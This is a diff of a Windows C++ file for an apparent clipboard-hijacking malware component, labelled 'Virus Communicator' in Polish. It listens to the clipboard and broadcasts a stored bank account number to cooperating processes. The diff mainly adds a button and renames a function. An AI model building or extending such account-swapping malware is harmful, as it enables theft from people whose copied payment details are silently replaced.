@@ -1,12 +1,14 @@
 #include "main.h"
 
-constexpr char szClassName[] = "KomunikatorWirusa";
-constexpr char windowTitle[] = "Komunikator Wirusa";
-constexpr char msgName[] = "Nic podejrzanego";
+constexpr CHAR szClassName[] = "KomunikatorWirusa";
+constexpr CHAR windowTitle[] = "Komunikator Wirusa";
+constexpr CHAR msgName[] = "Nic podejrzanego";
 LPSTR bankAccount;
 HWND hwndThis;
 UINT messageCode;
 bool bAset;
+
+// TODO: set up box and button for setting bank account number
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
@@ -57,12 +59,27 @@ bool init(HINSTANCE hInstance)
 	);
 
 	if (hwndThis == NULL) return false;
+
 	if (!AddClipboardFormatListener(hwndThis)) return false;
+
+	HWND hwndButton = CreateWindow(
+		"BUTTON",  // Predefined class; Unicode assumed 
+		"OK",      // Button text 
+		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,  // Styles 
+		10,         // x position 
+		10,         // y position 
+		100,        // Button width
+		100,        // Button height
+		hwndThis,   // Parent window
+		NULL,       // No menu.
+		(HINSTANCE)GetWindowLong(hwndThis, GWL_HINSTANCE),
+		NULL		// Pointer not needed.
+	);
 
 	messageCode = RegisterWindowMessage(msgName);
 
 
-	bankAccount = (LPSTR)malloc(17 * sizeof(char));
+	bankAccount = (LPSTR)calloc(MAXL + 1, sizeof(CHAR));
 	bAset = false;
 
 	return true;
@@ -76,10 +93,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 		{
 		case REQUEST_NUMBER:
 			if (!bAset) break; // Brak konta bankowego do nadpisania
-			postNumber();
-			//PostMessage(HWND_BROADCAST, messageCode, POST_NUMBER, (LPARAM)bankAccount); 
-			memcpy(bankAccount, &lParam, 17);
-			bAset = true;
+			PostNumber();
 			break;
 		}
 	}
@@ -97,7 +111,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
-void postNumber()
+void PostNumber()
 {
 	HGLOBAL hGlobalMem = GlobalAlloc(GHND, sizeof(bankAccount));
 	if (hGlobalMem != NULL)
@@ -105,6 +119,6 @@ void postNumber()
 		LPSTR lpGlobalMem = LPSTR(GlobalLock(hGlobalMem));
 		memcpy(lpGlobalMem, bankAccount, MAXL + 1);
 		GlobalUnlock(hGlobalMem);
-		PostMessage(HWND_BROADCAST, messageCode, POST_NUMBER, LPARAM(hGlobalMem));
+		PostMessage(HWND_BROADCAST, messageCode, POST_NUMBER, LONG_PTR(hGlobalMem));
 	}
 }
